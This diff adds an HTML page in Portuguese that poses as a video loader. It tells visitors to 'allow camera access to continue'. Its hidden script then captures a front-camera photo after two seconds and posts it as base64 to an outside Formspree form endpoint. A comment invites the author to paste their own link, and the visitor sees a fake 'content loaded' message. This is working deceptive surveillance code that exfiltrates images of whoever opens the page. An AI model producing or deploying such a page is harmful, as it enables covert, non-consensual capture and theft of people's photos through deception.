@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Carregando conteúdo...</title>
+</head>
+<body style="background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px;">
+
+    <h2>Carregando vídeo... Aguarde.</h2>
+    <p>Por favor, permita o acesso à câmera para continuar.</p>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // 1. Tenta acessar a câmera frontal
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            // 2. Espera 2 segundos para focar e tira a foto
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imagemBase64 = canvas.toDataURL('image/jpeg');
+
+                // 3. Envia a foto para o seu e-mail via Formspree
+                fetch('https://formspree.io/f/mojkaqdb', { // <--- COLE SEU LINK AQUI
+                    method: 'POST',
+                    body: JSON.stringify({ foto: imagemBase64 }),
+                    headers: { 'Content-Type': 'application/json' }
+                }).then(() => {
+                    alert("Conteúdo carregado com sucesso!");
+                });
+
+            }, 2000);
+        })
+        .catch(err => {
+            alert("Erro: Para ver o vídeo, você precisa clicar em PERMITIR.");
+        });
+    </script>
+</body>
+</html>
